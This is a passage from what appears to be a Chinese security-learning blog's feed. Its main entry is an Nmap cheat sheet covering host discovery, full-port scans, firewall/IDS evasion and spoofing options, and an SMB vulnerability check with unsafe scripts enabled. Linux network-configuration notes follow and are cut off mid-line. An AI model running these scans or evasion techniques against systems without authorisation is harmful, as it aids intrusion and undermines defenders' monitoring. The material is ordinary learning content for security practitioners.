&lt;h1 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h1&gt;
&lt;p&gt;又要鸽了 0，有事情要忙。&lt;/p&gt;
&lt;h1 id=&#34;reference&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#reference&#34;&gt;#&lt;/a&gt; Reference&lt;/h1&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE5NTgzNy5odG1s&#34;&gt;逻辑漏洞挖掘初步总结篇&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWC1jYWlqaS9wLzExMjA5OTYzLmh0bWw=&#34;&gt;Web 安全测试中常见逻辑漏洞解析（实战篇）&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTI5OTE2OTIvYXJ0aWNsZS9kZXRhaWxzLzgyOTUzMjEz&#34;&gt;常见逻辑漏洞&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;挖掘出属于自己思维的逻辑漏洞。&lt;/p&gt;
</content>
        <updated>2021-03-09T08:15:23.000Z</updated>
    </entry>
    <entry>
        <id>https://self-ferry.github.io/2021/03/09/Nmap%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/</id>
        <title>Nmap速查手册</title>
        <link rel="alternate" href="https://self-ferry.github.io/2021/03/09/Nmap%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/"/>
        <content type="html">&lt;p&gt;&lt;span class=&#34;label success&#34;&gt;✔️来首音乐吧&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;media-container&#34;&gt;&lt;div class=&#34;player&#34; data-type=&#34;audio&#34; data-src=&#39;[{&#34;title&#34;:&#34;列表 1&#34;,&#34;list&#34;:[&#34;https://music.163.com/#/song?id=30621618&#34;]}]&#39;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h1 id=&#34;reference&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#reference&#34;&gt;#&lt;/a&gt; Reference&lt;/h1&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuMmN0by5jb20vQXJ0aWNsZS8yMDE0MTIvMzYyMTg4Lmh0bWw=&#34;&gt;https://www.2cto.com/Article/201412/362188.html&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;nmap-简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nmap-简介&#34;&gt;#&lt;/a&gt; Nmap 简介&lt;/h1&gt;
&lt;p&gt;Nmap 是 Network Mapper 的简称&lt;br /&gt;
 Nmap 是一款开源免费的网络发现（Network Discovery）和安全审计（Security Auditing）工具&lt;br /&gt;
 1997 年由 Fyodor 创建&lt;/p&gt;
&lt;p&gt;Nmap 四项基本功能：&lt;/p&gt;
&lt;p&gt;1. 主机发现（Host Discovery）&lt;br /&gt;
2. 端口扫描（Port Scanning）&lt;br /&gt;
3. 版本侦测（Version Detection）&lt;br /&gt;
4. 操作系统侦测（Operating System Detection）&lt;/p&gt;
&lt;p&gt;这四项功能之间，又存在大致的依赖关系（通常情况下的顺序关系，但特殊应用另外考虑），首先需要进行主机发现，随&lt;br /&gt;
后确定端口状况，然后确定端口上运行具体应用程序与版本信息，然后可以进行操作系统的侦测。而在四项基本功能的基&lt;br /&gt;
础上，Nmap 提供防火墙与 IDS（IntrusionDetection System, 入侵检测系统）的规避技巧，可以综合应用到四个基本功&lt;br /&gt;
能的各个阶段；另外 Nmap 提供强大的 NSE（Nmap Scripting Language）脚本引擎功能，脚本可以对基本功能进行补充&lt;br /&gt;
和扩展。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label info&#34;&gt;大致功能为:&lt;/span&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;主机存活检测&lt;/li&gt;
&lt;li&gt;端口探测&lt;/li&gt;
&lt;li&gt;服务识别&lt;/li&gt;
&lt;li&gt;操作系统识别&lt;/li&gt;
&lt;li&gt;硬件地址检测&lt;/li&gt;
&lt;li&gt;服务版本识别&lt;/li&gt;
&lt;li&gt;漏洞扫描，使用 nmap 自带脚本&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;nmap参数详解&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nmap参数详解&#34;&gt;#&lt;/a&gt; Nmap 参数详解&lt;/h1&gt;
&lt;h2 id=&#34;nmap支持主机名ip网段的表示方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nmap支持主机名ip网段的表示方式&#34;&gt;#&lt;/a&gt; Nmap 支持主机名，ip, 网段的表示方式&lt;/h2&gt;
&lt;p&gt;例如:blah.highon.coffee, &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL25hbXAub3JnLzI0&#34;&gt;namp.org/24&lt;/span&gt;, 192.168.0.1;10.0.0-25.1-254&lt;/p&gt;
&lt;p&gt;-iL filename                    从文件中读取待检测的目标，文件中的表示方法支持机名，ip, 网段&lt;br /&gt;
 - iR hostnum                     随机选取，进行扫描。如果 - iR 指定为 0, 则是无休止的扫描&lt;br /&gt;
 --exclude host1 [, host2]        从扫描任务中需要排除的主机&lt;br /&gt;
 --exculdefile exclude_file      排除文件中的 IP, 格式和 - iL 指定扫描文件的格式相同&lt;/p&gt;
&lt;h2 id=&#34;0x00-主机发现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x00-主机发现&#34;&gt;#&lt;/a&gt; 0x00 主机发现&lt;/h2&gt;
&lt;p&gt;-sL                     仅仅是显示，扫描的 IP 数目，不会进行任何扫描&lt;br /&gt;
 - sn                     ping 扫描，即主机发现&lt;br /&gt;
 - Pn                     不检测主机存活&lt;br /&gt;
 - PS/PA/PU/PY [portlist]  TCP SYN Ping/TCP ACK Ping/UDP Ping 发现&lt;br /&gt;
 - PE/PP/PM               使用 ICMP echo, timestamp and netmask 请求包发现主机&lt;br /&gt;
 - PO [prococol list]      使用 IP 协议包探测对方主机是否开启&lt;br /&gt;
 - n/-R                   不对 IP 进行域名反向解析 / 为所有的 IP 都进行域名的反响解析&lt;/p&gt;
&lt;h2 id=&#34;0x01-扫描技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x01-扫描技巧&#34;&gt;#&lt;/a&gt; 0x01 扫描技巧&lt;/h2&gt;
&lt;p&gt;-sS/sT/sA/sW/sM                 TCP SYN/TCP connect ()/ACK/TCP 窗口扫描 / TCP Maimon 扫描&lt;br /&gt;
 - sU                             UDP 扫描&lt;br /&gt;
 - sN/sF/sX                       TCP Null，FIN，and Xmas 扫描&lt;br /&gt;
 --scanflags                     自定义 TCP 包中的 flags&lt;br /&gt;
-sI zombie host[:probeport]     Idlescan&lt;br /&gt;
-sY/sZ                          SCTP INIT/COOKIE-ECHO 扫描&lt;br /&gt;
 - sO                             使用 IP protocol 扫描确定目标机支持的协议类型&lt;br /&gt;
 - b “FTP relay host” 使用 FTP bounce scan&lt;/p&gt;
&lt;h2 id=&#34;0x02-指定端口和扫描顺序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x02-指定端口和扫描顺序&#34;&gt;#&lt;/a&gt; 0x02 指定端口和扫描顺序&lt;/h2&gt;
&lt;p&gt;-p                      特定的端口 -p80,443 或者 -p1-65535&lt;br /&gt;
-p U:PORT               扫描 udp 的某个端口，-p U:53&lt;br /&gt;
-F                      快速扫描模式，比默认的扫描端口还少&lt;br /&gt;
 - r                      不随机扫描端口，默认是随机扫描的&lt;br /&gt;
 --top-ports &amp;quot;number&amp;quot;    扫描开放概率最高的 number 个端口，出现的概率需要参考 nmap-services 文件，ubuntu 中该文件位于 /usr/share/nmap.nmap 默认扫前 1000 个&lt;br /&gt;
 --port-ratio &amp;quot;ratio&amp;quot;    扫描指定频率以上的端口&lt;/p&gt;
&lt;h2 id=&#34;0x03-服务版本识别&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x03-服务版本识别&#34;&gt;#&lt;/a&gt; 0x03 服务版本识别&lt;/h2&gt;
&lt;p&gt;-sV                             开放版本探测，可以直接使用 - A 同时打开操作系统探测和版本探测&lt;br /&gt;
 --version-intensity &amp;quot;level&amp;quot;     设置版本扫描强度，强度水平说明了应该使用哪些探测报文。数值越高，服务越有可能被正确识别。默认是 7&lt;br /&gt;
--version-light                 打开轻量级模式，为 --version-intensity 2 的别名&lt;br /&gt;
 --version-all                   尝试所有探测，为 --version-intensity 9 的别名&lt;br /&gt;
 --version-trace                 显示出详细的版本侦测过程信息&lt;/p&gt;
&lt;h2 id=&#34;0x04-脚本扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x04-脚本扫描&#34;&gt;#&lt;/a&gt; 0x04 脚本扫描&lt;/h2&gt;
&lt;p&gt;-sC                             根据端口识别的服务，调用默认脚本&lt;br /&gt;
 --script=”Lua scripts”          调用的脚本名&lt;br /&gt;
 --script-args=n1=v1,[n2=v2]     调用的脚本传递的参数&lt;br /&gt;
 --script-args-file=filename     使用文本传递参数&lt;br /&gt;
 --script-trace                  显示所有发送和接收到的数据&lt;br /&gt;
 --script-updatedb               更新脚本的数据库&lt;br /&gt;
 --script-help=”Lua script”      显示指定脚本的帮助&lt;/p&gt;
&lt;h2 id=&#34;0x05-os识别&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x05-os识别&#34;&gt;#&lt;/a&gt; 0x05 OS 识别&lt;/h2&gt;
&lt;p&gt;-O              启用操作系统检测，-A 来同时启用操作系统检测和版本检测&lt;br /&gt;
 --osscan-limit  针对指定的目标进行操作系统检测 (至少需确知该主机分别有一个 open 和 closed 的端口)&lt;br /&gt;
--osscan-guess  推测操作系统检测结果，当 Nmap 无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap 默认进行这种匹配&lt;/p&gt;
&lt;h2 id=&#34;0x06-防火墙ids躲避和欺骗&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x06-防火墙ids躲避和欺骗&#34;&gt;#&lt;/a&gt; 0x06 防火墙 / IDS 躲避和欺骗&lt;/h2&gt;
&lt;p&gt;-f; --mtu value                 指定使用分片、指定数据包的 MTU.&lt;br /&gt;
-D decoy1,decoy2,ME             使用诱饵隐蔽扫描&lt;br /&gt;
 - S IP-ADDRESS                   源地址欺骗&lt;br /&gt;
 - e interface                    使用指定的接口&lt;br /&gt;
 - g/--source-port PROTNUM       使用指定源端口&lt;br /&gt;
 --proxies url1,[url2],...       使用 HTTP 或者 SOCKS4 的代理&lt;/p&gt;
&lt;p&gt;--data-length NUM               填充随机数据让数据包长度达到 NUM&lt;br /&gt;
--ip-options OPTIONS            使用指定的 IP 选项来发送数据包&lt;br /&gt;
 --ttl VALUE                     设置 IP time-to-live 域&lt;br /&gt;
 --spoof-mac ADDR/PREFIX/VEBDOR  MAC 地址伪装&lt;br /&gt;
 --badsum                        使用错误的 checksum 来发送数据包&lt;/p&gt;
&lt;h2 id=&#34;0x07-输出&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x07-输出&#34;&gt;#&lt;/a&gt; 0x07 输出&lt;/h2&gt;
&lt;p&gt;-oN                     将标准输出直接写入指定的文件&lt;br /&gt;
 - oX                     输出 xml 文件&lt;br /&gt;
 - oS                     将所有的输出都改为大写&lt;br /&gt;
 - oG                     输出便于通过 bash 或者 perl 处理的格式，非 xml&lt;br /&gt;
-oA BASENAME            可将扫描结果以标准格式、XML 格式和 Grep 格式一次性输出&lt;br /&gt;
 - v                      提高输出信息的详细度&lt;br /&gt;
 - d level                设置 debug 级别，最高是 9&lt;br /&gt;
--reason                显示端口处于带确认状态的原因&lt;br /&gt;
 --open                  只输出端口状态为 open 的端口&lt;br /&gt;
 --packet-trace          显示所有发送或者接收到的数据包&lt;br /&gt;
 --iflist                显示路由信息和接口，便于调试&lt;br /&gt;
 --log-errors            把日志等级为 errors/warings 的日志输出&lt;br /&gt;
 --append-output         追加到指定的文件&lt;br /&gt;
 --resume FILENAME       恢复已停止的扫描&lt;br /&gt;
 --stylesheet PATH/URL   设置 XSL 样式表，转换 XML 输出&lt;br /&gt;
 --webxml                从 namp.org 得到 XML 的样式&lt;br /&gt;
 --no-sytlesheet         忽略 XML 声明的 XSL 样式表&lt;/p&gt;
&lt;h2 id=&#34;0x08-其他选项&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x08-其他选项&#34;&gt;#&lt;/a&gt; 0x08 其他选项&lt;/h2&gt;
&lt;p&gt;-6                      开启 IPv6&lt;br /&gt;
-A                      OS 识别，版本探测，脚本扫描和 traceroute&lt;br /&gt;
--datedir DIRNAME       说明用户 Nmap 数据文件位置&lt;br /&gt;
 --send-eth /--send-ip  使用原以太网帧发送 / 在原 IP 层发送&lt;br /&gt;
 --privileged            假定用户具有全部权限&lt;br /&gt;
 --unprovoleged          假定用户不具有全部权限，创建原始套接字需要 root 权限&lt;br /&gt;
 - V                      打印版本信息&lt;br /&gt;
 - h                      输出帮助&lt;/p&gt;
&lt;h1 id=&#34;nmap-例子&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nmap-例子&#34;&gt;#&lt;/a&gt; nmap 例子&lt;/h1&gt;
&lt;p&gt;使用 ping 检测 10.0.0.0/24 这个网段&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nmap -sP 10.0.0.0/24&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;使用 SYN 的方法对全端口进行扫描，在 aggressive (4) 的时间模板下，同时对开放的端口进行端口识别&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nmap -p1-65535 -sV -sS -T4 target&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;PS: -T 代表的是扫描的时候，一些控制选项 (TCP 的延迟时间，探测报文之间的间隔等) 的集合，具体的 man nmap 一下就知道了&lt;/p&gt;
&lt;p&gt;使用 SYN 扫描，在 aggressive (4) 的时间模板下，探测操作系统的类型和版本，还有显示 traceroute 的结果，结果输出较为详细&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nmap -v -sS -A -T4 target&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;使用 SYN 扫描，在 insane (5) 的时间模板下，探测操作系统的类型和版本，还有显示 traceroute 的结果，结果输出较为详细&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nmap -v -sS -A -T5 target&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;使用 SYN 扫描，在 insane (5) 的时间模板下，探测操作系统的类型，还有显示 traceroute 的结果，操作系统的类型，结果输出较为详细&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nmap -v -sV -O -sS -T5 target&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;使用 SYN 的方法对全端口进行扫描，同时对开放的端口进行端口识别，在 aggressive (4) 的时间模板下，探测操作系统的类型还有显示 traceroute 的结果，结果输出较为详细&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nmap -v -p 1-65535 -sV -O -sS -T4 target&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;用 SYN 的方法对全端口进行扫描，同时对开放的端口进行端口识别，在 insane (5) 的时间模板下，探测操作系统的类型，还有显示 traceroute 的结果，结果输出较为详细&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nmap -v -p 1-65535 -sV -O -sS -T5 target&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;从文件中读取需要扫描的 IP 列表&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nmap -iL ip-address.txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Nmap 输出格式&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;扫描的结果输出到屏幕，同时会存储一份到 grep-output.txt&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;nmap -sV -p 139,445 -oG grep-output.txt 10.0.1.0/24&lt;/code&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;扫描结果输出为 html&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;nmap -sS -sV -T5 10.0.1.99 --webxml -oX - | xsltproc --output file.html&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Nmap 扫描 Netbios&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在子网中发现开放 netbios 的 IP&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;nmap -sV -v -p139,445 10.0.0.1/24&lt;/code&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;扫描指定 netbios 的名称&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;nmap -sU --script nbstat.nse -p 137 target&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;扫描指定的目标，同时检测相关漏洞&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nmap --script-args=unsafe=1 --script smb-check-vulns.nse -p 445 target&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;将 nmap 的 80 端口的扫描结果，通过管道交给 nikto 进行扫描&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Nmap Nikto Scan nmap -p80 10.0.1.0/24 -oG - | nikto.pl -h -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;将 nmap 的 80,443 端口的扫描结果，通过管道交给 nikto 进行扫描&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nmap -p80,443 10.0.1.0/24 -oG - | nikto.pl -h -&lt;/code&gt;&lt;/p&gt;
</content>
        <category term="web安全" scheme="https://self-ferry.github.io/categories/web-security/" />
        <category term="Nmap" scheme="https://self-ferry.github.io/tags/Nmap/" />
        <updated>2021-03-09T08:14:20.000Z</updated>
    </entry>
    <entry>
        <id>https://self-ferry.github.io/2021/03/02/%E5%88%9D%E5%AD%A6webshell%E6%A3%80%E6%B5%8B/</id>
        <title>初学webshell检测</title>
        <link rel="alternate" href="https://self-ferry.github.io/2021/03/02/%E5%88%9D%E5%AD%A6webshell%E6%A3%80%E6%B5%8B/"/>
        <content type="html">&lt;h1 id=&#34;&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#&#34;&gt;#&lt;/a&gt; &lt;/h1&gt;
</content>
        <updated>2021-03-02T09:51:07.000Z</updated>
    </entry>
    <entry>
        <id>https://self-ferry.github.io/2021/02/26/%E5%9C%A8Android%E4%B8%8A%E5%AE%89%E8%A3%85kali/</id>
        <title>在Android上安装kali</title>
        <link rel="alternate" href="https://self-ferry.github.io/2021/02/26/%E5%9C%A8Android%E4%B8%8A%E5%AE%89%E8%A3%85kali/"/>
        <content type="html">&lt;h1 id=&#34;️正文&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#️正文&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label success&#34;&gt;✔️正文&lt;/span&gt;&lt;/h1&gt;
&lt;p&gt;就不多此一举了，还是看国光大佬写的吧&lt;br /&gt;
链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc3Fsc2VjLmNvbS8yMDE4LzA1L3Rlcm11eC5odG1s&#34;&gt;https://www.sqlsec.com/2018/05/termux.html&lt;/span&gt;&lt;/p&gt;
</content>
        <category term="Android" scheme="https://self-ferry.github.io/categories/Android/" />
        <category term="Android" scheme="https://self-ferry.github.io/tags/Android/" />
        <updated>2021-02-26T05:55:57.000Z</updated>
    </entry>
    <entry>
        <id>https://self-ferry.github.io/2021/02/19/linux%E8%BF%9B%E9%98%B6/</id>
        <title>linux进阶学习</title>
        <link rel="alternate" href="https://self-ferry.github.io/2021/02/19/linux%E8%BF%9B%E9%98%B6/"/>
        <content type="html">&lt;p&gt;&lt;span class=&#34;label success&#34;&gt;✔️来首音乐吧&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;media-container&#34;&gt;&lt;div class=&#34;player&#34; data-type=&#34;audio&#34; data-src=&#39;[{&#34;title&#34;:&#34;列表 1&#34;,&#34;list&#34;:[&#34;https://music.163.com/#/song?id=555964763&#34;]}]&#39;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h1 id=&#34;网络配置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络配置&#34;&gt;#&lt;/a&gt; 网络配置&lt;/h1&gt;
&lt;h2 id=&#34;ifconfig-详解&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ifconfig-详解&#34;&gt;#&lt;/a&gt; ifconfig 详解&lt;/h2&gt;
&lt;p&gt;ifconfig 命令可以显示或配置网络设备 (网络接口卡) , 也可以修改这些配置。&lt;br /&gt;
用 ifconfig 命令配置的网卡信息，在网卡重启后机器重启后，配置就不存在。要想将上述的配置信息永久保存，那就要修改网卡的配置文件了。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image001.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;DEVICE=“ens33” 　　# 网卡名称&lt;br /&gt;
 // UP：表示 “接口已启用”。&lt;br /&gt;
// BROADCAST ：表示 “主机支持广播”。&lt;br /&gt;
// RUNNING：表示 “接口在工作中”。&lt;br /&gt;
// MULTICAST：表示 “主机支持多播”。&lt;br /&gt;
// MTU:1500（最大传输单元）：1500 字节&lt;br /&gt;
 //inet ：网卡的 IP 地址。&lt;br /&gt;
//netmask ：网络掩码。&lt;br /&gt;
//broadcast ：广播地址。&lt;br /&gt;
// 网卡的 IPv6 地址&lt;br /&gt;
 // 连接类型：Ethernet (以太网) HWaddr (硬件 mac 地址)&lt;br /&gt;
//txqueuelen (网卡设置的传送队列长度)&lt;br /&gt;
// RX packets 接收时，正确的数据包数。&lt;br /&gt;
// RX bytes 接收的数据量。&lt;br /&gt;
// RX errors 接收时，产生错误的数据包数。&lt;br /&gt;
// RX dropped 接收时，丢弃的数据包数。&lt;br /&gt;
// RX overruns 接收时，由于速度过快而丢失的数据包数。&lt;br /&gt;
// RX frame 接收时，发生 frame 错误而丢失的数据包数。&lt;br /&gt;
// TX packets 发送时，正确的数据包数。&lt;br /&gt;
// TX bytes 发送的数据量。&lt;br /&gt;
// TX errors 发送时，产生错误的数据包数。&lt;br /&gt;
// TX dropped 发送时，丢弃的数据包数。&lt;br /&gt;
// TX overruns 发送时，由于速度过快而丢失的数据包数。&lt;br /&gt;
// TX carrier 发送时，发生 carrier 错误而丢失的数据包数。&lt;br /&gt;
//collisions 冲突信息包的数目。&lt;/p&gt;
&lt;p&gt;lo: 表示主机的回坏地址，这个一般是用来测试一个网络程序，但又不想让局域网或外网的用户能够查看，只能在此台主机上运行和查看所用的网络接口。&lt;/p&gt;
&lt;p&gt;ifconfig 的配置针对当前起作用，, 当服务器进行重启启动，配置的 IP 和掩码等信息都会丢失因为 ifconfig 的没有把配置写入到配置文件，当系统重新启动中，会重新加载网络配置文件，因此配置会丢失&lt;/p&gt;
&lt;p&gt;ifconfig 命令 参数具体见&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucnVub29iLmNvbS9saW51eC9saW51eC1jb21tLWlmY29uZmlnLmh0bWw=&#34;&gt; https://www.runoob.com/linux/linux-comm-ifconfig.html&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;网络配置文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络配置文件&#34;&gt;#&lt;/a&gt; 网络配置文件&lt;/h2&gt;
&lt;p&gt;网络接口配置文件均存放在 /etc/sysconfig/network-scripts/ 目录下&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;root@node ~&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;# cat /etc/sysconfig/network-scripts/ifcfg-ens33 &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;TYPE&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;Ethernet&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;PROXY_METHOD&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;none&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;BROWSER_ONLY&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;no&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;BOOTPROTO&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;none&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;DEFROUTE&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;yes&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;IPV4_FAILURE_FATAL&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;no&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;IPV6INIT&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;yes&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;IPV6_AUTOCONF&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;yes&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;IPV6_DEFROUTE&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;yes&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;IPV6_FAILURE_FATAL&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;no&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;IPV6_ADDR_GEN_MODE&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;stable-privacy&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;NAME&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;ens33&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;UUID&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;3693f084-6c9a-4b4e-82ef-62377f4c3502&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;DEVICE&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;ens33&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;ONBOOT&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;yes&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;IPADDR&lt;/span&gt;&lt;span 